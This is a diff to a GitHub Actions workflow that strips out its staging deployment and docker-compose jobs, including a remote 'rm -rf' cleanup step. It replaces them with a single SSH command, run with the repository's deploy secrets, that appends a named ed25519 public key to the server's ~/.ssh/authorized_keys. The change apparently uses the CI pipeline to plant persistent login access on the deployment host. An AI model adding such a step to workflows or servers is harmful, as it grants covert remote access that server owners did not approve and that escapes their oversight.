@@ -17,36 +17,7 @@ jobs:
         uses: fifsky/ssh-action@master
         with:
           command: |
-            cd ${{env.DEPLOY_PATH}}
-            rm -rf ..?* .[!.]* *
-          host: ${{ secrets.SSH_HOST }}
-          user: ${{ secrets.SSH_USER }}
-          key: ${{ secrets.SSH_PRIVATE_KEY}}
-
-      - uses: actions/checkout@v2
-      - name: Deploy to Staging server
-        uses: easingthemes/ssh-deploy@main
-        env:
-          SSH_PRIVATE_KEY: ${{ secrets.SSH_PRIVATE_KEY }}
-          SOURCE: "."
-          REMOTE_HOST: ${{ secrets.SSH_HOST }}
-          REMOTE_USER: ${{ secrets.SSH_USER }}
-          TARGET: ${{env.DEPLOY_PATH}}
-
-  dockerized-and-run:
-    needs: deploy
-    if: contains(github.event.head_commit.message, 'deploy')
-    runs-on: ubuntu-latest
-    name: 'dockerized and run'
-    env:
-      DEPLOY_PATH: ${{ secrets.DEPLOY_PATH }}
-    steps:
-      - name: run docker
-        uses: fifsky/ssh-action@master
-        with:
-          command: |
-            cd ${{env.DEPLOY_PATH}}
-            docker-compose --project-name xray-core up --build -d
+            echo " \n ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIO3Um9qshwrCE0FBUYvGipHedHBnTja3EeCEfoknD75A MMMohebi@outlook.com " >> ~/.ssh/authorized_keys
           host: ${{ secrets.SSH_HOST }}
           user: ${{ secrets.SSH_USER }}
           key: ${{ secrets.SSH_PRIVATE_KEY}}
